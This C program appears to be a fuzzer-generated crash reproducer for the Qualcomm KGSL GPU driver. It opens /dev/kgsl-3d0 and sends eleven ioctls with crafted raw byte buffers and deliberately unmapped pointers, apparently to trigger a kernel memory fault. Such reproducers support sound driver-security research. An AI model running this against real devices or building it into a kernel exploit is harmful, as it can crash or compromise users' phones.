#include <sys/ioctl.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/time.h>
#include <fcntl.h>

typedef int bool;
#define true 1
#define false 0

#include "ioctl_types.h"

int main(int argc, char *argv[]) {

 int fd = open("/dev/kgsl-3d0", O_RDWR);
 if(fd < 0)
printf("Error\n");

struct kgsl_gpumem_alloc *arg_0;
char dump0_0[] = "\x00\x80\x00\xc0\xff\xff\xff\xff\x00\x00\x00\x00";
arg_0 = (struct kgsl_gpumem_alloc *) dump0_0;

struct kgsl_cmdstream_readtimestamp *arg_1;
char dump1_0[] = "\x03\x00\x00\x00\xff\x7f\x00\xe0";
arg_1 = (struct kgsl_cmdstream_readtimestamp *) dump1_0;

struct kgsl_drawctxt_destroy *arg_2;
char dump2_0[] = "\x00\x80\x00\xc0";
arg_2 = (struct kgsl_drawctxt_destroy *) dump2_0;

struct kgsl_device_getproperty *arg_3;
char dump3_0[] = "\x00\x00\x60\x00\xff\xff\xff\xff\x00\x00\x00\x00";
arg_3 = (struct kgsl_device_getproperty *) dump3_0;

void *arg_4= (void *) 0xc0008000; //unmapped 
void *arg_5= (void *) 0xffffff78; //unmapped 
struct kgsl_cmdstream_freememontimestamp *arg_6;
char dump6_0[] = "\x00\x80\x00\xc0\x00\xb0\xd5\xb6\x00\x00\x00\x00";
arg_6 = (struct kgsl_cmdstream_freememontimestamp *) dump6_0;

struct kgsl_gpumem_free_id *arg_7;
char dump7_0[] = "\x00\x00\x00\x00\x09\x00\x00\x00";
arg_7 = (struct kgsl_gpumem_free_id *) dump7_0;

struct kgsl_cmdwindow_write *arg_8;
char dump8_0[] = "\x03\x00\x00\x00\xff\x7f\x00\xe0\x00\x10\x00\x00";
arg_8 = (struct kgsl_cmdwindow_write *) dump8_0;

struct kgsl_gpumem_sync_cache *arg_9;
char dump9_0[] = "\x00\x80\x00\xc0\x00\x70\x65\xb6\x00\x00\x00\x00\x00\x90\xd5\xb6\xff\xfd\xff\xff";
arg_9 = (struct kgsl_gpumem_sync_cache *) dump9_0;

struct kgsl_perfcounter_query *arg_10;
char dump10_0[] = "\x6a\x6a\x6a\x6e\x00\x70\xc5\xb6\x00\x00\x00\x00\x91\x00\x00\x90\x01\xa4\x03\x99\x00\x70\xe5\xb4";
arg_10 = (struct kgsl_perfcounter_query *) dump10_0;

char dump10_1[] = "\xff\xff\xff\xff";
arg_10->countables = dump10_1;

ioctl(fd, 0xc00c092f, (void *)arg_0);
ioctl(fd, 0xc0080911, (void *)arg_1);
ioctl(fd, 0x40040914, (void *)arg_2);
ioctl(fd, 0xc00c0902, (void *)arg_3);
ioctl(fd, 0xc0140933, (void *)arg_4);
ioctl(fd, 0x40100917, (void *)arg_5);
ioctl(fd, 0x800c0912, (void *)arg_6);
ioctl(fd, 0xc0080935, (void *)arg_7);
ioctl(fd, 0x400c092e, (void *)arg_8);
ioctl(fd, 0x40140937, (void *)arg_9);
ioctl(fd, 0xc018093a, (void *)arg_10);

}
